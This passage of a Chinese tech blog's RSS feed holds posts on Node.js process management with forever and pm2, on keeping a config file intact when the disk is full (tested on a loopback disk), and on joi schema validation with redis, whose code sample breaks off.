一个补丁方案：程序收到forever的退出信号后将日志直接写到日志文件（正常情况下是由forever捕获程序的错误输出写日志文件）。
</p></li>

<li><p>
重启可能失败
</p>

<p>
代码更新后，forever会发信号重启进程，但是程序始终重启不成功，出现大量下面的日志：
</p>
<pre class="example">
Error: bind EADDRINUSE
</pre>

<p>
怀疑跟node.js的cluster中master自动拉起slave的行为相冲突，此时只有一个forever实例在运行，这种情况占比很高。
</p>

<p>
另外crontab中调用start.sh也可能和forever相冲突，当node全退出时，可能启动多个forever实例，这种情况占比稍低。
</p>

<p>
另外一种情况是node.js出问题了CPU及内存100%占用，此时普通的kill杀不死（必须得kill -9），forever误认为已成功结束node.js进程，
然后拉起新的进程。
</p></li>

<li><p>
未内置支持开机启动
</p>

<p>
可以直接放在crontab每分钟调用一次 <code>start.sh</code> 来实现，万一连forever进程都挂了，可以全部拉起来。
开机启动不内置则意味着一百个人有一百种做法，带来不必要的争议。
</p></li>

<li><p>
允许程序同时启动多个实例
</p>

<p>
forever未对启动的程序进行唯一性标识，导致程序可能意外启动多个实例，多个实例之间往往相冲突，降低了系统可用性。
</p>

<p>
而由程序自已来实现单实例运行是很困难的，forever会不断地拉起退出的多余副本。
</p></li>

<li><p>
未内置支持cluster以及优雅重启
</p>

<p>
部署代码重启程序过程中会停止服务几秒钟。
</p></li>
</ul></li>
</ul>
</div>
</div>

<div id="outline-container-orgc55b5fd" class="outline-2">
<h2 id="orgc55b5fd"><a href="https://github.com/Unitech/pm2">pm2</a></h2>
<div class="outline-text-2" id="text-orgc55b5fd">
<ul class="org-ul">
<li><p>
安装
</p>

<div class="org-src-container">
<pre class="src src-js">npm install -g pm2
</pre>
</div></li>

<li><p>
配置
</p>

<p>
以 <a href="https://github.com/tangxinfa/upload-fiddle">upload-fiddle</a> 项目为例。
</p>

<p>
统一配置其它脚本需要的环境变量
<code>.bashrc</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">export</span> <span style="color: #f0c674;">PATH</span>=<span style="color: #b294bb;">`pwd`</span>/node/bin:<span style="color: #b294bb;">`pwd`</span>/../node/bin:<span style="color: #b294bb;">`pwd`</span>/node_modules/pm2/bin:/usr/loc<span style="text-decoration: underline;">al/node/bin:$</span><span style="color: #f0c674; text-decoration: underline;">PATH</span>
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">NODE_ENV</span>=${<span style="color: #f0c674;">NODE_ENV</span>:-production}
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">NODE_CONFIG_DIR</span>=<span style="color: #b294bb;">`pwd`</span>/config
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">APP_NAME</span>=<span style="color: #8abeb7;">"upload-fiddle"</span>
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">APP_SCRIPT</span>=<span style="color: #b294bb;">`pwd`</span>/src/index.js
</pre>
</div>

<p>
启动脚本
<code>start.sh</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #b294bb;">source</span> .bashrc
pm2 --node-args=<span style="color: #8abeb7;">"--harmony"</span> -n <span style="color: #8abeb7;">"$APP_NAME"</span> start <span style="color: #8abeb7;">"$APP_SCRIPT"</span> -i 0 --watch <span style="color: #8abeb7;">"`pw</span><span style="color: #8abeb7; text-decoration: underline;">d`/src/*.js"</span>
</pre>
</div>

<p>
停止脚本
<code>stop.sh</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #b294bb;">source</span> .bashrc
pm2 --node-args=<span style="color: #8abeb7;">"--harmony"</span> stop <span style="color: #8abeb7;">"$APP_NAME"</span>
</pre>
</div>

<p>
重启脚本
<code>restart.sh</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #b294bb;">source</span> .bashrc
pm2 --node-args=<span style="color: #8abeb7;">"--harmony"</span> restart <span style="color: #8abeb7;">"$APP_NAME"</span>
</pre>
</div></li>

<li><p>
用法
</p>

<p>
启动
</p>

<div class="org-src-container">
<pre class="src src-sh">./start.sh
</pre>
</div>

<p>
停止
</p>

<div class="org-src-container">
<pre class="src src-sh">./stop.sh
</pre>
</div>

<p>
重启
</p>

<div class="org-src-container">
<pre class="src src-sh">./restart.sh
</pre>
</div></li>

<li>缺点

<ul class="org-ul">
<li><p>
程序退出过程中的日志无法捕获？
</p>

<p>
不一定。使用 <code>pm2 stop</code> 会有同样的问题，但是pm2支持优雅退出（ <code>pm2 gracefulReload</code> ），此时不但退出过程中的日志能够正常捕获，而且可以实现服务0停机时间。
</p></li>

<li><p>
重启可能失败
</p>

<p>
是的。=pm2 restart= 并没有采用激进的措施（kill -9）确保旧进程结束。重现步骤：用gdb调试运行中的node进程（gdb node &lt;PID&gt;后不执行任何gdb命令），然后用pm2 restart重启服务，此时旧的进程杀不死，新的进程被创建。
</p></li>

<li><p>
允许程序同时启动多个实例
</p>

<p>
pm2对启动的程序进行了唯一性标识，但是它将启动的信息保存在了当前用户的home目录下（~/.pm2），所以使用其它帐号时还是有能够启动多个程序实例，对于这一点forever也存在同样的问题。
</p>

<p>
对于服务器来说，多帐号是常态，应该默认防止这种问题发生。
</p></li>
</ul></li>
</ul>
</div>
</div>

<div id="outline-container-orgb66abb0" class="outline-2">
<h2 id="orgb66abb0">程序写日志相关</h2>
<div class="outline-text-2" id="text-orgb66abb0">
<p>
用c/c++写日志的时候我一般都会使用日志库，如：<a href="http://logging.apache.org/log4cxx/index.html">log4cxx</a> 、<a href="https://github.com/HardySimpson/zlog">zlog</a> ，这些日志库容易使用而且很稳定，支持将日志写到文件或控制台，支持按大小、日期分割日志文件，支持限定日志文件数、占用空间。
</p>

<p>
但是node.js下最好的写日志方式其实是将日志直接输出到错误输出（stderr），由 <a href="https://github.com/nodejitsu/forever">forever</a> 、<a href="https://github.com/Unitech/pm2">pm2</a> 这样的后台服务监护工具来写日志文件。这是因为node.js做为一种动态语言，容易出现异常，特别是前期开发阶段，很多分支没有跑到，往往是写日志的语句出错，此时日志库是很难做到将异常时程序的调用堆栈写到日志文件中的，由台后服务监护工具来做能确保万无一失。
</p>
</div>
</div>

<div id="outline-container-org9c16a13" class="outline-2">
<h2 id="org9c16a13">参考</h2>
<div class="outline-text-2" id="text-org9c16a13">
<ul class="org-ul">
<li>《<a href="http://se77en.cc/2013/06/27/goodbye-node-forever-hello-pm2-translation/">告别node-forever,拥抱PM2</a>》</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[config库避免磁盘满时配置文件被截断]]></title>
            <link>/article/config-5e93907f514d78c176d86ee165f6914d7f6e65874ef688ab622a65ad.html</link>
            <guid>/article/config-5e93907f514d78c176d86ee165f6914d7f6e65874ef688ab622a65ad.html</guid>
            <pubDate>Mon, 20 Jul 2015 09:35:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
<a href="https://github.com/tangxinfa/config">config</a> 库在实际使用过程中发现一个问题：磁盘满时写配置文件可能导致配置文件被清空（文件大小为0）。
</p>

<p>
想到两种方案：
</p>

<ul class="org-ul">
<li><p>
写-替换
</p>

<p>
先写到一个临时文件，写成功后替换目标文件，这是由linux下重命名（rename）文件的原子性保证的。由于我们是通过对配置文件加锁的方式支持多进程访问的，可以对配置文件使用独立的锁文件，一想起到配置文件目录里将出现一大堆锁文件，胃就不舒服。
</p></li>

<li><p>
预分配空间
</p>

<p>
先确保文件拥有足够的空间再写入。虽然不是原子性的，但已经能够解决问题。我比较倾向于这个方案。
</p></li>
</ul>

<div id="outline-container-org4db9313" class="outline-2">
<h2 id="org4db9313">通过预分配空间方式安全写文件算法</h2>
<div class="outline-text-2" id="text-org4db9313">
<ul class="org-ul">
<li>如果当前文件过小（不足以容纳新内容），在文件尾部通过追加占位字符（\0）直到文件大小合适</li>

<li>写入新内容</li>

<li>将过多的空间截掉</li>
</ul>

<p>
具体实现参见： <a href="https://github.com/tangxinfa/config/commit/5ed686fc42c3356658d67d2d3bb59d3435f8c68f">5ed686f Fix bug: config file content missing when disk full</a> .
</p>
</div>
</div>

<div id="outline-container-orge19d362" class="outline-2">
<h2 id="orge19d362">测试</h2>
<div class="outline-text-2" id="text-orge19d362">
</div>
<div id="outline-container-org4496660" class="outline-3">
<h3 id="org4496660">创建模拟磁盘目录 /mnt/disk</h3>
<div class="outline-text-3" id="text-org4496660">
<p>
先确保存在 <code>/dev/loop*</code> 设备，如果不存在先尝试挂载 <code>loop</code> 内核模块
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo modprobe loop
</pre>
</div>

<p>
如果还是没有 <code>loop</code> 设备，可能是最近进行了系统升级，重启后再试。
</p>

<p>
创建模拟磁盘（/mnt/disk）：
</p>

<pre class="example">
$ sudo dd if=/dev/zero of=~/Examples/disk.img bs=8M count=1
$ sudo losetup /dev/loop0 ~/Examples/disk.img
$ sudo parted /dev/loop0
GNU Parted 3.2
Using /dev/loop0
Welcome to GNU Parted! Type 'help' to view a list of commands.
(parted) mklabel gpt
Warning: The existing disk label on /dev/loop0 will be destroyed and all data on
this disk will be lost. Do you want to continue?
Yes/No? yes
(parted) mkpart primary 0MB 8MB
Warning: The resulting partition is not properly aligned for best performance.
Ignore/Cancel? Ignore
(parted) print
Model: Loopback device (loopback)
Disk /dev/loop0: 8389kB
Sector size (logical/physical): 512B/512B
Partition Table: gpt
Disk Flags: 

Number  Start   End     Size    File system  Name  Flags
 1      17.4kB  8372kB  8354kB

(parted) quit
$ sudo mkfs.ext4 /dev/loop0p1
$ sudo mkdir /mnt/disk
$ sudo mount /dev/loop0p1 /mnt/disk
</pre>
</div>
</div>

<div id="outline-container-org8625a64" class="outline-3">
<h3 id="org8625a64">修复前</h3>
<div class="outline-text-3" id="text-org8625a64">
<p>
磁盘空间不足写配置导致配置文件被损坏
</p>

<pre class="example">
$ sudo ~/Opensource/config/config /mnt/disk/test.json set name libconfig
name: libconfig
$ sudo dd if=/dev/zero of=/mnt/disk/other.data bs=1 obs=1 count=100000000
dd: error writing ‘/mnt/disk/other.data’: No space left on device
6821889+0 records in
6821888+0 records out
6821888 bytes (6.8 MB) copied, 7.44769 s, 916 kB/s
dd: error writing ‘/mnt/disk/other.data’: No space left on device
6821889+0 records in
6821888+0 records out
6821888 bytes (6.8 MB) copied, 7.53017 s, 906 kB/s
$ sudo ~/Opensource/config/config /mnt/disk/test.json set data "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
config: write: No space left on device
config: save config file(/mnt/disk/test.json) failed
data: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
$ sudo ~/Opensource/config/config /mnt/disk/test.json get name
config: get items(name,,,,,) from config file(/mnt/disk/test.json) failed
</pre>
</div>
</div>

<div id="outline-container-org4fa30f5" class="outline-3">
<h3 id="org4fa30f5">修复后</h3>
<div class="outline-text-3" id="text-org4fa30f5">
<p>
磁盘空间不足写配置不会对配置文件造成实质影响
</p>

<pre class="example">
$ sudo ~/Opensource/config/config /mnt/disk/test.json set name libconfig
name: libconfig
$ sudo dd if=/dev/zero of=/mnt/disk/other.data bs=1 obs=1 count=100000000
dd: error writing ‘/mnt/disk/other.data’: No space left on device
6821889+0 records in
6821888+0 records out
6821888 bytes (6.8 MB) copied, 7.6254 s, 895 kB/s
$ sudo ~/Opensource/config/config /mnt/disk/test.json set data "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
config: write: No space left on device
config: save config file(/mnt/disk/test.json) failed
data: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
$ sudo ~/Opensource/config/config /mnt/disk/test.json get name
name: libconfig
</pre>
</div>
</div>

<div id="outline-container-orge068e10" class="outline-3">
<h3 id="orge068e10">清除测试环境</h3>
<div class="outline-text-3" id="text-orge068e10">
<div class="org-src-container">
<pre class="src src-sh">sudo umount /dev/loop0p1
sudo losetup -d /dev/loop0
sudo rmdir /mnt/disk
sudo rm ~/Examples/disk.img
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-orgbba171e" class="outline-2">
<h2 id="orgbba171e">参考</h2>
<div class="outline-text-2" id="text-orgbba171e">
<p>
《<a href="http://www.oschina.net/translate/reliable-file-updates-with-python">使用 Python 进行稳定可靠的文件操作</a>》</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用node.js的对象模式验证模块joi引入强类型]]></title>
            <link>/article/4f7f7528-node.js-76845bf98c616a215f0f9a8c8bc16a215757-joi-5f1551655f3a7c7b578b.html</link>
            <guid>/article/4f7f7528-node.js-76845bf98c616a215f0f9a8c8bc16a215757-joi-5f1551655f3a7c7b578b.html</guid>
            <pubDate>Mon, 13 Jul 2015 10:44:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li><p>
弱类型的Javascript
</p>

<p>
Javascript是一门弱类型的语言，定义变量不需要指定类型，可以为同一个变量赋任意类型的值。误用类型不会报错，而结果会让你大吃一惊：
</p>

<pre class="example">
&gt; "1" + 1
'11'
&gt; if ("false") { console.log("yes") } else { console.log("no"); }
yes
undefined
&gt; 
</pre>

<p>
redis中很多数据结构取出时都是字符串值（如：set、hash），调用方需要自行将它转换成正确的类型（如：Boolean、Date、Number），如果不转换成正确的类型会导致冗长的代码，如Boolean类型：
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">if</span> ((String(model.stoped) == <span style="color: #8abeb7;">'true'</span>)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">Do something when stoped.</span>
}
</pre>
</div>

<p>
如果手工转换成正确的类型肯定要写很多样板代码了。
</p></li>

<li><p>
对象模式验证模块 <a href="https://github.com/hapijs/joi#anydefaultvalue-description">joi</a>
</p>

<p>
有很多的ORM（ Object Relational Mapping 对象关系映射）库都能够实现强类型的数据模型，但是它们都相当的复杂，支持各种各样的数据库后端，支持一对一、一对多、多对多等数据关系，但是很少支持分表分库，我们的系统一般是数据模型简单但要考虑用户量大了横向扩展，所以一开始就进行了分表分库，无法使用重型的ORM。
</p>

<p>
如果有一个能够自动根据模式（Schema）定义对值进行类型转换的库，一定会非常有用。
</p>

<p>
<a href="https://github.com/hapijs/joi#anydefaultvalue-description">joi</a> 一个Javascript对象模式描述语言以及验证（Object schema description language and validator for JavaScript objects）的库，它可以完成对象类型转换以及合法性验证。
</p></li>

<li><p>
<a href="https://github.com/hapijs/joi#anydefaultvalue-description">joi</a> 的用法示例
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">joi</span> = require(<span style="color: #8abeb7;">'joi'</span>);
<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">redis</span> = require(<span style="color: #8abeb7;">'redis'</span>);

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">client</span> = redis.createClient(6379, <span style="color: #8abeb7;">'127.0.0.1'</span>);

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">User</span> = <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">options</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (! options) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   options = {};
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #81a2be;">this</span>.id = options.id || 0;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #81a2be;">this</span>.name = options.name || <span style="color: #8abeb7;">''</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #81a2be;">this</span>.male = options.male || <span style="color: #81a2be;">true</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #81a2be;">this</span>.birthday = options.birthday;
};

User.schema = joi.object().keys({
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   id: joi.number().integer().min(1),
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   name: joi.string().required(),
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   male: joi.<span style="color: #81a2be;">boolean</span>().<span style="color: #b5bd68;">default</span>(<span style="color: #81a2be;">true</span>),
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   birthday: joi.date().required()
});

User.find = <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">id</span>, <span style="color: #f0c674;">callback</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.hgetall(<span style="color: #8abeb7;">"user:"</span> + id, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>, <span style="color: #f0c674;">value</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> callback(err);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   } <span style="color: #b5bd68;">else</span> <span style="color: #b5bd68;">if</span> (! value) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> callback(<span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Error</span>(<span style="color: #8abeb7;">"User not found"</span>));
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   joi.validate(value, User.schema, callback);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
};

User.<span style="color: #81a2be;">prototype</span>.save = <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">callback</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">value</span> = {};
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">for</span>(<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">fieldName</span> <span style="color: #b5bd68;">in</span> <span style="color: #81a2be;">this</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #b5bd68;">typeof</span>(<span style="color: #81a2be;">this</span>[fieldName]) != <span style="color: #8abeb7;">'function'</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   value[fieldName] = <span style="color: #81a2be;">this</span>[fieldName];
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   joi.validate(value, User.schema, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>, <span style="color: #f0c674;">validatedValue</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> callback(err);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.hmset(<span style="color: #8abeb7;">"user:"</span> + validatedValue.id, validatedValue, callback);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
};


<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">user</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">User</span>({
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   id: 1,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   name: <span style="color: #8abeb7;">"txf"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   male: <span style="color: #81a2be;">true</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   birthday: <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Date</span>(<span style="color: #8abeb7;">"1983-03-22"</span>)
});

user.save(<span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.error(<span style="color: #8abeb7;">"user save error("</span> + err.toString() + <span style="color: #8abeb7;">")"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.quit();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

